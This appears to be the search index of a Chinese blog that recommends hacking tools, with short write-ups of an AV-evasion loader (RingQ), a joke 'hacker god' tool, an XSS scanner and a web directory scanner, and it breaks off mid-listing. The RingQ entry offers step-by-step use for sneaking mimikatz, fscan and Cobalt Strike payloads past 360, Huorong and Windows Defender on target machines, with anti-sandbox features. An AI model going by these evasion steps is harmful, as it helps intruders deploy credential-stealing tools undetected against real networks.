<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>交流群-需要解密</title>
      <link href="/2024/12/15/36-%E4%BA%A4%E6%B5%81%E7%BE%A4-%E8%A7%A3%E5%AF%86/"/>
      <url>/2024/12/15/36-%E4%BA%A4%E6%B5%81%E7%BE%A4-%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>商务合作请添加Yancy_76,说明来意.</p><h1 id="QQ交流群"><a href="#QQ交流群" class="headerlink" title="QQ交流群:"></a>QQ交流群:</h1><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">660264846</span><br></pre></td></tr></tbody></table></figure><p>解密方案:base64 + 与佛论禅</p><p>加群flag:</p><p><img src="https://pic.imgdb.cn/item/65f933929f345e8d035bb7c7.png" alt="img"></p><p>解密视频:</p><iframe src="//player.bilibili.com/player.html?bvid=BV1Hu4m1u7mv&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 加密解密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64-后渗透免杀工具-RingQ-6月24号更新</title>
      <link href="/2024/06/25/64-%E5%90%8E%E6%B8%97%E9%80%8F%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/06/25/64-%E5%90%8E%E6%B8%97%E9%80%8F%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="RingQ"><a href="#RingQ" class="headerlink" title="RingQ"></a>RingQ</h1><p><a href="https://github.com/T4y1oR/RingQ">https://github.com/T4y1oR/RingQ</a></p><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>后渗透场景，杀毒软件落地秒了我的大保健 fscan mimikatz … 这还让我怎么内网渗透啊？</p><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>不用关心怎么实现免杀，也不用浪费时间和精力去对某一款工具进行专项修改达成免杀效果</p><p>助力每一位像我这样的脚本小子快速实现免杀，hvv尽快打穿目标内网</p><p>支持bypass 360 火绒 Windows Defender，一键免杀上线CS、fscan、mimikatz …</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装:"></a>安装:</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要git命令</span></span><br><span class="line">git clone https://github.com/T4y1oR/RingQ.git</span><br><span class="line">cd RingQ</span><br></pre></td></tr></tbody></table></figure><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><ol><li><p>你的任意exe工具，放在与Create.exe 同文件夹下运行即可，会生成一个混淆的main.txt文件。</p><p><em>Create.exe 此程序仅用于混淆生成main.txt文件，可能存在报毒(c++你懂的) 添加白名单or虚拟机断网使用都可以。</em></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create.exe mimikatz.exe</span><br></pre></td></tr></tbody></table></figure></li><li><p>将main.txt和RingQ.exe上传到目标机器，执行 RingQ.exe ~</p><p>内置反沙箱等 执行后有些许延迟 耐心一会儿~</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RingQ.exe</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="本地加载"><a href="#本地加载" class="headerlink" title="本地加载"></a>本地加载</h4><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/help-local.gif"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/help-local.gif" alt="img"></a></p><h4 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h4><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/help-remote.gif"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/help-remote.gif" alt="img"></a></p><h4 id="绝对路径加载"><a href="#绝对路径加载" class="headerlink" title="绝对路径加载"></a>绝对路径加载</h4><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/help-local-absolute.gif"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/help-local-absolute.gif" alt="img"></a></p><h4 id="CS-shellcode"><a href="#CS-shellcode" class="headerlink" title="CS shellcode"></a>CS shellcode</h4><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/help-shellcode.gif"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/help-shellcode.gif" alt="img"></a></p><h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/image-20240511172315793.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/image-20240511172315793.png" alt="img"></a> <a href="https://github.com/T4y1oR/RingQ/blob/main/images/image-20240511172315791.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/image-20240511172315791.png" alt="img"></a></p><h3 id="微步"><a href="#微步" class="headerlink" title="微步"></a><strong>微步</strong></h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/image-20240511162750465.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/image-20240511162750465.png" alt="img"></a></p><h3 id="360（2024-06-24更新）"><a href="#360（2024-06-24更新）" class="headerlink" title="360（2024.06.24更新）"></a><strong>360</strong>（2024.06.24更新）</h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/360.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/360.png" alt="img"></a> <a href="https://github.com/T4y1oR/RingQ/blob/main/images/360sandbox.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/360sandbox.png" alt="img"></a></p><h3 id="Windows-Defender（2024-06-24更新）"><a href="#Windows-Defender（2024-06-24更新）" class="headerlink" title="Windows Defender（2024.06.24更新）"></a><strong>Windows Defender</strong>（2024.06.24更新）</h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/DF.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/DF.png" alt="img"></a></p><h3 id="火绒6-0（2024-06-24更新）"><a href="#火绒6-0（2024-06-24更新）" class="headerlink" title="火绒6.0（2024.06.24更新）"></a><strong>火绒6.0</strong>（2024.06.24更新）</h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/hr.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/hr.png" alt="img"></a></p><h3 id="QVM202-报毒是启发式静态扫描，修改文件资源伪造成正常文件一样即可绕过。"><a href="#QVM202-报毒是启发式静态扫描，修改文件资源伪造成正常文件一样即可绕过。" class="headerlink" title="QVM202 报毒是启发式静态扫描，修改文件资源伪造成正常文件一样即可绕过。"></a>QVM202 报毒是启发式静态扫描，修改文件资源伪造成正常文件一样即可绕过。</h3><h3 id="添加签名、文件名、图标、属性信息、资源…"><a href="#添加签名、文件名、图标、属性信息、资源…" class="headerlink" title="添加签名、文件名、图标、属性信息、资源…"></a>添加签名、文件名、图标、属性信息、资源…</h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/Snipaste_2024-05-19_18-15-10.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/Snipaste_2024-05-19_18-15-10.png" alt="img"></a></p><p><em>该报毒不是主程序源码被360干掉，此程序我在2024.01月份就一直在实战中使用。</em></p><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/Snipaste_2024-05-19_18-54-11.png"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/Snipaste_2024-05-19_18-54-11.png" alt="img"></a></p><h3 id="QVM250（bypass-360-QVM202）"><a href="#QVM250（bypass-360-QVM202）" class="headerlink" title="QVM250（bypass 360 QVM202）"></a><a href="https://github.com/T4y1oR/RingQ/tree/main/QVM250">QVM250</a>（bypass 360 QVM202）</h3><p><a href="https://github.com/T4y1oR/RingQ/blob/main/images/QVM250.gif"><img src="https://github.com/T4y1oR/RingQ/raw/main/images/QVM250.gif" alt="img"></a></p><p><em>图标支持自定义，存放在QVM250/main文件夹内即可。</em></p><h2 id="已开源，放心食用，编译后的RingQ-exe是经过bypass-QVM202的-帮助懒惰的脚本小子-如不放心可自行编译使用QVM250即可。"><a href="#已开源，放心食用，编译后的RingQ-exe是经过bypass-QVM202的-帮助懒惰的脚本小子-如不放心可自行编译使用QVM250即可。" class="headerlink" title="已开源，放心食用，编译后的RingQ.exe是经过bypass QVM202的 帮助懒惰的脚本小子 如不放心可自行编译使用QVM250即可。"></a><a href="https://github.com/T4y1oR/RingQ/tree/main/RingQ">已开源</a>，放心食用，编译后的RingQ.exe是经过bypass QVM202的 <del>帮助懒惰的脚本小子</del> 如不放心可自行编译使用<a href="https://github.com/T4y1oR/RingQ/tree/main/QVM250">QVM250</a>即可。</h2><h2 id="后续如报毒属于正正正正正常现象，提issues（报毒截图and时间环境信息）耐心等待更新即可。tips-Star后更新更快！"><a href="#后续如报毒属于正正正正正常现象，提issues（报毒截图and时间环境信息）耐心等待更新即可。tips-Star后更新更快！" class="headerlink" title="后续如报毒属于正正正正正常现象，提issues（报毒截图and时间环境信息）耐心等待更新即可。tips: Star后更新更快！"></a>后续如报毒属于正正正正正常现象，提issues（报毒截图and时间环境信息）耐心等待更新即可。tips: Star后更新更快！</h2><h2 id="项目仅供进行学习研究，切勿用于任何非法未授权的活动，如个人使用违反安全相关法律，后果与本人无关。"><a href="#项目仅供进行学习研究，切勿用于任何非法未授权的活动，如个人使用违反安全相关法律，后果与本人无关。" class="headerlink" title="项目仅供进行学习研究，切勿用于任何非法未授权的活动，如个人使用违反安全相关法律，后果与本人无关。"></a>项目仅供进行学习研究，切勿用于任何非法未授权的活动，如个人使用违反安全相关法律，后果与本人无关。</h2><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>2024.06.24 360QVM202报毒 已更新，火绒标记Hacktools 已更新。</p><p>2024.06.21 360QVM202报毒 已更新，修改部分代码逻辑。</p><p>2024.06.20 360QVM202报毒 已更新，修复执行无响应。</p><p>2024.06.19 更新Banner，优化部分源码。</p><p>2024.06.18 360QVM202报毒 已更新。 <del>最近有点忙啊啊啊</del></p><p>2024.06.11 火绒标记Hacktools 已更新（Create.exe无需更新 仅用于生成混淆文件），360QVM202报毒 已更新。</p><p>2024.06.05 CMD执行卡住BUG 已修复。</p><p>2024.06.04 测试时遗留的StringTable 已删除。</p><p>2024.05.31-06.04 360QVM202报毒 已更新，开源RingQ</p><p>2024.05.30 360QVM202报毒 已更新，新增CS shellcode加载上线</p><p>2024.05.28 更新两种加载方式，远程加载and绝对路径加载</p><p>2024.05.27 360QVM202报毒 已更新</p><p>2024.05.24 RingQ 360QVM202报毒 已更新，Create火绒报毒 已更新，QVM250失效 已更新</p><p>2024.05.23 360QVM202报毒 已更新，火绒报毒mimikatz 已更新</p><p>2024.05.22 QVM250发布，bypass 360QVM202 持续报毒 生成后的文件多执行几次脚本 (开源项目有效期短)</p><p>2024.05.14-21 360QVM202报毒 已更新，这个报毒自行更换图标，添加签名… <del>如果持续出现这个问题，多点star出个专项bypass QVM202脚本</del> Releases新增RingQ.exe原编译出的main.exe文件，方便大家自定义修改降熵</p><p>2024.05.11 项目发布，微步纯绿 企业360云沙箱 火绒 卡巴斯基 <del>没传VT是为了能大家能用久点，大家随意</del></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ul><li>unhook</li><li><a href="https://github.com/T4y1oR/LoveSysdiag">不让我传fscan 直接干掉AV？ 项目: LoveSysdiag</a></li><li>远程加载</li><li>bypass QVM202</li><li>…</li></ul><p><a href="https://starchart.cc/T4y1oR/RingQ"><img src="https://camo.githubusercontent.com/6e694bfa45589629c4d573b63885bd187797be07e327eb80296860b2d07c07e7/68747470733a2f2f7374617263686172742e63632f543479316f522f52696e67512e7376673f76617269616e743d6164617074697665" alt="Stargazers over time"></a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
            <tag> 后渗透免杀工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>63-[娱乐工具]-一键日卫星工具</title>
      <link href="/2024/06/15/63-%E5%A8%B1%E4%B9%90%E5%B7%A5%E5%85%B7-%E4%B8%80%E9%94%AE%E6%97%A5%E5%8D%AB%E6%98%9F%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/06/15/63-%E5%A8%B1%E4%B9%90%E5%B7%A5%E5%85%B7-%E4%B8%80%E9%94%AE%E6%97%A5%E5%8D%AB%E6%98%9F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="GodOfHacker"><a href="#GodOfHacker" class="headerlink" title="GodOfHacker"></a>GodOfHacker</h1><p>黑客神器，谁用谁知道！</p><p>github链接:<a href="https://github.com/WWILLV/GodOfHacker">https://github.com/WWILLV/GodOfHacker</a></p><p>下载链接:<a href="https://github.com/WWILLV/GodOfHacker/releases/tag/1.0.1.1">https://github.com/WWILLV/GodOfHacker/releases/tag/1.0.1.1</a></p><h2 id="软件特性"><a href="#软件特性" class="headerlink" title="软件特性"></a>软件特性</h2><p>本软件功能强大，由各种顶级黑客技术结合而成，基本功能覆盖面广，可满足大多数人的基本需求。</p><p>此外软件高度定制化，拥有插件功能，可使用各种强大的插件来丰富软件功能。</p><p>部分功能截图如下</p><p><a href="https://camo.githubusercontent.com/ddebacd371c06a9d8518a5d22506dc22e4b58d3701c5a0a9af4dbbf0215a4744/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393735616333342e706e67"><img src="https://camo.githubusercontent.com/ddebacd371c06a9d8518a5d22506dc22e4b58d3701c5a0a9af4dbbf0215a4744/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393735616333342e706e67" alt="1.png"></a> <a href="https://camo.githubusercontent.com/c15ed418dcd0a5535919db33a87ef93d37f2754cc4141c0ec72c070bd45132e9/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393736356165302e706e67"><img src="https://camo.githubusercontent.com/c15ed418dcd0a5535919db33a87ef93d37f2754cc4141c0ec72c070bd45132e9/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393736356165302e706e67" alt="2.png"></a> <a href="https://camo.githubusercontent.com/4d35992ca8151a20c988fc11fa2992158a46fd8e4927f75c330b18367488cee4/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393736616636372e706e67"><img src="https://camo.githubusercontent.com/4d35992ca8151a20c988fc11fa2992158a46fd8e4927f75c330b18367488cee4/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393736616636372e706e67" alt="3.png"></a> <a href="https://camo.githubusercontent.com/831df3cbd65eb7e6b651a879d5644b5eeac9fdbc3ae688982e6f52ecaac27eb6/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393737383332322e706e67"><img src="https://camo.githubusercontent.com/831df3cbd65eb7e6b651a879d5644b5eeac9fdbc3ae688982e6f52ecaac27eb6/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f30342f356236353236393737383332322e706e67" alt="4.png"></a></p><p>啥也不说了，贼强！</p><h2 id="Release"><a href="#Release" class="headerlink" title="Release"></a>Release</h2><p>下载在release里</p><p><a href="https://github.com/WWILLV/GodOfHacker/releases/latest">https://github.com/WWILLV/GodOfHacker/releases/latest</a></p><h2 id="目前实现的功能"><a href="#目前实现的功能" class="headerlink" title="目前实现的功能"></a>目前实现的功能</h2><h3 id="日站综合"><a href="#日站综合" class="headerlink" title="日站综合"></a>日站综合</h3><p>根据域名/IP一键攻击或一键使用0day攻击</p><p>可选各种漏洞进行一键攻击、提权</p><p>综合功能：</p><ul><li>挂黑页、DDOS、社管理员全家、日后台、挂马、断室友网</li><li>百度、谷歌批量日站、免费上网、破解各种网吧</li><li>盗QQ号、刷Q币、刷会员、刷心悦3、日运营商免费打电话充话费</li><li>进内网、翻墙、澳门赌场、IP定位、顺着网线砍人</li><li>日教务系统、挖洞、发布漏洞、自动代码审计、读内存</li></ul><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><ul><li>根据文件一键破解、逆源码</li><li>一键注释代码（AI）、激活系统、激活所有软件、日穿系统、生成POC</li><li>一键破解手机应用、游戏、汉化、汉化并steam差评+1</li></ul><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul><li>一键日平台、出flag、偷flag、生成wp、搅屎、断网</li><li>一键交易、改排名、自动做题（AI）</li><li>一键锤爆出题人的头</li><li>一键加CTF交流群</li></ul><h3 id="无线"><a href="#无线" class="headerlink" title="无线"></a>无线</h3><ul><li>一键蹭Wifi、中间人、看妹子手机里的自拍</li><li>一键伪基站、窃听、做钓鱼Wifi</li></ul><h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><ul><li>一键日无人机、日ATM、偷银行卡、充饭卡、日卫星</li><li>一键保佑服务器不宕机、日穿CPU、烧随机硬件</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>玄学许愿，出货率UP</li><li>实验性功能（AI）：一键绿帽、自动与妹子尬聊、提升好感度</li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>支持各种语言（包括但不限于C(C ++)、Java、Python、Ruby、Javascript、php、C#……）</p><p>甚至，可以使用txt、exe等文件做插件</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 娱乐工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>62-XSS自动扫描工具 - X-Recon</title>
      <link href="/2024/06/13/62-XSS%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-X-Recon/"/>
      <url>/2024/06/13/62-XSS%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-X-Recon/</url>
      
        <content type="html"><![CDATA[<p> <a href="https://github.com/joshkar/X-Recon"><img src="https://github.com/joshkar/X-Recon/raw/main/.imgs/banner.jpg" alt="X-侦察"></a></p><h4 id="用于识别网页输入并进行-XSS-扫描的实用程序。"><a href="#用于识别网页输入并进行-XSS-扫描的实用程序。" class="headerlink" title="用于识别网页输入并进行 XSS 扫描的实用程序。"></a>用于识别网页输入并进行 XSS 扫描的实用程序。</h4><p>目前测试PHP开发的网站比较好用,其他自行测试!</p><p><a href="http://python.org/"><img src="https://camo.githubusercontent.com/2b67215b1f14c2b78b7fbbb0f2de3d1fea1276cc68a9f0fab475ce5a329c8214/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d76332d626c7565" alt="img"> </a><a href="https://en.wikipedia.org/wiki/Linux"><img src="https://camo.githubusercontent.com/1ffbafdfd9ce5312d5640c000f8c4e0b559e538f22773c122e358ccd031bee8f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f506c6174666f726d2d4c696e75782d726564" alt="img"></a></p><h3 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h3><ul><li><strong>子域名发现：</strong><ul><li>检索目标网站的相关子域名并将其整合到白名单中。这些子域名可在抓取过程中使用。</li></ul></li><li><strong>全站链接发现：</strong><ul><li>根据提供的白名单和指定的 收集整个网站的所有链接<code>max_depth</code>。</li></ul></li><li><strong>表单和输入提取：</strong><ul><li>识别提取的链接中找到的所有表单和输入，生成 JSON 输出。此 JSON 输出是利用该工具的 XSS 扫描功能的基础。</li></ul></li><li><strong>XSS 扫描：</strong><ul><li>一旦开始侦察选项返回包含提取条目的自定义 JSON，X-Recon 工具就可以启动 XSS 漏洞测试过程并为您提供所需的结果！</li></ul></li></ul><p><a href="https://github.com/joshkar/X-Recon"><img src="https://github.com/joshkar/X-Recon/raw/main/.imgs/demo1.jpg" alt="X-侦察"></a></p><p><strong>笔记：</strong></p><blockquote><p>目前，扫描功能在 SPA（单页应用程序）Web 应用程序上不可用，我们仅在使用 PHP 开发的网站上进行了测试，取得了显著的效果。未来，我们计划将这些功能整合到该工具中。</p></blockquote><p><a href="https://github.com/joshkar/X-Recon"><img src="https://github.com/joshkar/X-Recon/raw/main/.imgs/demo2.jpg" alt="X-Recon XSS 扫描"></a></p><p><strong>笔记：</strong></p><blockquote><p>此工具会维护一个最新的文件扩展名列表，这些文件扩展名会在探索过程中跳过。默认列表包括图像、样式表和脚本 ( <code>".css",".js",".mp4",".zip","png",".svg",".jpeg",".webp",".jpg",".gif"</code>) 等常见文件类型。您可以通过编辑 setting.json 文件自定义此列表，以更好地满足您的需求。</p></blockquote><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/joshkar/X-Recon</span><br><span class="line">$ cd X-Recon</span><br><span class="line">$ python3 -m pip install -r requirements.txt</span><br><span class="line">$ python3 xr.py</span><br></pre></td></tr></tbody></table></figure><h2 id="测试目标："><a href="#测试目标：" class="headerlink" title="测试目标："></a>测试目标：</h2><blockquote><p>您可以在“获取 URL”部分中使用此地址</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://testphp.vulnweb.com</span><br><span class="line">#不可以携带http</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
            <tag> XSS扫描工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>61-web目录扫描工具中的神器-dirmap</title>
      <link href="/2024/06/01/61-web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%A5%9E%E5%99%A8-dirmap/"/>
      <url>/2024/06/01/61-web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%A5%9E%E5%99%A8-dirmap/</url>
      
        <content type="html"><![CDATA[<h1 id="Dirmap"><a href="#Dirmap" class="headerlink" title="Dirmap"></a>Dirmap</h1><p>链接：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/README_EN.md">English</a></p><p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/doc/dirmap.png"><img src="https://github.com/H4ckForJob/dirmap/raw/master/doc/dirmap.png" alt="dirmap"></a></p><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><p>经过大量调研，总结一个优秀的web目录扫描工具至少具备以下功能：</p><ul><li>并发引擎</li><li>能使用字典</li><li>能纯爆破</li><li>能爬取页面动态生成字典</li><li>能fuzz扫描</li><li>自定义请求</li><li>自定义响应结果处理…</li></ul><p>那么接下来看看Dirmap的<strong>特点</strong>吧</p><h1 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h1><ol><li>支持n个target*n个payload并发</li><li>支持递归扫描</li><li>支持自定义需要递归扫描的状态码</li><li>支持(单|多)字典扫描</li><li>支持自定义字符集爆破</li><li>支持爬虫动态字典扫描</li><li>支持自定义标签fuzz目标url</li><li>自定义请求User-Agent</li><li>自定义请求随机延时</li><li>自定义请求超时时间</li><li>自定义请求代理</li><li>自定义正则表达式匹配假性404页面</li><li>自定义要处理的响应状态码</li><li>自定义跳过大小为x的页面</li><li>自定义显示content-type</li><li>自定义显示页面大小</li><li>按域名去重复保存结果</li></ol><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="环境准备-python-3-7"><a href="#环境准备-python-3-7" class="headerlink" title="环境准备:python 3.7 +"></a>环境准备:python 3.7 +</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/H4ckForJob/dirmap.git #克隆</span><br><span class="line">cd dirmap #进入目录 </span><br><span class="line">python3 -m pip install -r requirement.txt #安装必须库</span><br></pre></td></tr></tbody></table></figure><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><h3 id="输入目标"><a href="#输入目标" class="headerlink" title="输入目标"></a>输入目标</h3><p>单目标，默认为http</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.1 -lcf</span><br></pre></td></tr></tbody></table></figure><p>子网（CIDR格式）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.0/24 -lcf</span><br></pre></td></tr></tbody></table></figure><p>网络范围</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf</span><br></pre></td></tr></tbody></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -iF targets.txt -lcf</span><br></pre></td></tr></tbody></table></figure><p><code>targets.txt</code>中支持上述格式</p><h3 id="结果保存"><a href="#结果保存" class="headerlink" title="结果保存"></a>结果保存</h3><ol><li>结果将自动保存在项目根目录下的<code>output</code>文件夹中</li><li>每一个目标生成一个txt，命名格式为<code>目标域名.txt</code></li><li>结果自动去重复，不用担心产生大量冗余</li></ol><h2 id="高级使用"><a href="#高级使用" class="headerlink" title="高级使用"></a>高级使用</h2><p>自定义dirmap配置，开始探索dirmap高级功能</p><p>暂时采用加载配置文件的方式进行详细配置，<strong>不支持使用命令行参数进行详细配置</strong>！</p><p>编辑项目根目录下的<code>dirmap.conf</code>，进行配置</p><p><code>dirmap.conf</code>配置详解</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 